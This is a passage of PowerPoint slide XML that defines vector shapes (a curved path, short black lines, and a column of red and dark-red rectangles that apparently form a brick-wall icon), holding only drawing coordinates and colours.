                  <a:pt x="28" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="99" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="130" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="163" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="179" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="196" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="211" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="226" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="240" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="254" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="267" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="279" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="289" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="294" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="302" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="307" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="310" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="312" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="316" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="318" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="321" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="324" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="324" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="321" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="318" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="316" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="312" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="310" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="307" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="302" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298" y="18"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="294" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="289" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="279" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="267" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="254" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="240" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="226" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="211" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="196" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="179" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="163" y="0"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="14400">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="446" name="Line 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3501720" y="3979800"/>
            <a:ext cx="92160" cy="1440"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="34920">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="447" name="Line 63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3678120" y="4049640"/>
            <a:ext cx="81000" cy="1440"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="34920">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="448" name="Line 64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3587400" y="3979800"/>
            <a:ext cx="93960" cy="69840"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="34920">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="449" name="Line 65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3501720" y="4047840"/>
            <a:ext cx="92160" cy="1800"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="34920">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="450" name="Line 66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3678120" y="3978000"/>
            <a:ext cx="81000" cy="1800"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="34920">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="451" name="Line 67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="3587400" y="3978000"/>
            <a:ext cx="93960" cy="69840"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="34920">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="452" name="CustomShape 68"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5008680" y="4919760"/>
            <a:ext cx="132480" cy="899280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e0e0e0"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="453" name="CustomShape 69"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5003640" y="4919760"/>
            <a:ext cx="135720" cy="100800"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="86" h="64">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="86" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="808080"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="454" name="CustomShape 70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5008680" y="5051520"/>
            <a:ext cx="64440" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="455" name="CustomShape 71"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5076720" y="5049720"/>
            <a:ext cx="67680" cy="53280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="456" name="CustomShape 72"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5041800" y="4991040"/>
            <a:ext cx="67680" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="457" name="CustomShape 73"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5111640" y="4991040"/>
            <a:ext cx="32760" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="458" name="CustomShape 74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5002200" y="4991040"/>
            <a:ext cx="34200" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="459" name="CustomShape 75"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5006880" y="4929120"/>
            <a:ext cx="67680" cy="53280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="460" name="CustomShape 76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5078520" y="4930920"/>
            <a:ext cx="67680" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="461" name="CustomShape 77"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5006880" y="5170320"/>
            <a:ext cx="62640" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="462" name="CustomShape 78"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5076720" y="5170320"/>
            <a:ext cx="65880" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="463" name="CustomShape 79"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5041800" y="5110200"/>
            <a:ext cx="65880" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="464" name="CustomShape 80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5110200" y="5110200"/>
            <a:ext cx="34200" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="465" name="CustomShape 81"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5008680" y="5110200"/>
            <a:ext cx="26280" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="466" name="CustomShape 82"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5006880" y="5286240"/>
            <a:ext cx="62640" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="467" name="CustomShape 83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5076720" y="5286240"/>
            <a:ext cx="65880" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="468" name="CustomShape 84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5041800" y="5227560"/>
            <a:ext cx="65880" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="469" name="CustomShape 85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5110200" y="5227560"/>
            <a:ext cx="34200" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="470" name="CustomShape 86"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5006880" y="5227560"/>
            <a:ext cx="27720" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="471" name="CustomShape 87"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5006880" y="5407200"/>
            <a:ext cx="62640" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="472" name="CustomShape 88"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5076720" y="5407200"/>
            <a:ext cx="65880" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="473" name="CustomShape 89"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5040360" y="5346720"/>
            <a:ext cx="67680" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="474" name="CustomShape 90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5110200" y="5346720"/>
            <a:ext cx="32760" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="475" name="CustomShape 91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5008680" y="5346720"/>
            <a:ext cx="26280" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="476" name="CustomShape 92"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5006880" y="5526000"/>
            <a:ext cx="65880" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="477" name="CustomShape 93"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5076720" y="5524560"/>
            <a:ext cx="67680" cy="53280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="478" name="CustomShape 94"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5041800" y="5465880"/>
            <a:ext cx="67680" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="479" name="CustomShape 95"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5111640" y="5465880"/>
            <a:ext cx="32760" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="e00000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="480" name="CustomShape 96"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5006880" y="5645160"/>
            <a:ext cx="62640" cy="51840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
